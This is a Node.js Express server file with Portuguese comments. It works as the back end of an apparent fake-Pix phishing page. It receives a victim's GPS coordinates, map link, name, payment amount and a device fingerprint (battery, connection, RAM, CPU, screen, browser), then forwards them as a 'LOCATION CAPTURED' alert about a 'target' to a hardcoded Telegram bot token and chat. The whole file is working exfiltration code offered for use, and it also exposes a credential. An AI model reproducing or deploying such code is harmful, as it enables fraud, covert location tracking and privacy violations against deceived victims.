// server.js
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Seus dados do Telegram (Mantive os mesmos que você enviou)
const TELEGRAM_BOT_TOKEN = "8510330829:AAG5Z_9XupX2x_GqeXPgfAooOjVC61L78v8";
const TELEGRAM_CHAT_ID = "-5124871642";

app.post("/send-location", async (req, res) => {
  // 1. Recebendo todos os dados novos vindos do site
  const {
    latitude, longitude, maps,
    nome, valor,                  // Dados do Pix Falso
    bateria, conexao, ram, cpu, tela, navegador // Dados do Fingerprint
  } = req.body;

  // 2. Montando a mensagem BONITA em HTML
  // Usamos tags <b> para negrito e <code> para facilitar copiar
  const message = `
🚨 <b>LOCALIZAÇÃO CAPTURADA!</b> 🚨

🎯 <b>Alvo (Pix):</b> ${nome || 'Não informado'}
💰 <b>Valor:</b> R$ ${valor || 'Não informado'}

📍 <b>Latitude:</b> <code>${latitude}</code>
📍 <b>Longitude:</b> <code>${longitude}</code>
🗺️ <b>Maps:</b> ${maps}

📱 <b>DADOS DO DISPOSITIVO (Fingerprint):</b>
🔋 <b>Bateria:</b> ${bateria || '?'}
📡 <b>Conexão:</b> ${conexao || '?'}
💾 <b>RAM:</b> ${ram || '?'}
⚙️ <b>CPU:</b> ${cpu || '?'}
🖥️ <b>Tela:</b> ${tela || '?'}
🌐 <b>Navegador:</b> ${navegador || '?'}
`;

  try {
    // Envia a mensagem formatada para o Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML" // Importante para o negrito funcionar
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.log(error);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
});

// Mantém a porta 8088 (ou a que o Render definir)
const port = process.env.PORT || 8088;

app.listen(port, () => {
  console.log(`Servidor rodando na porta ${port}`);
});

// Serve os arquivos estáticos se necessário (opcional se usar só como API)
app.use(express.static(__dirname));

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});
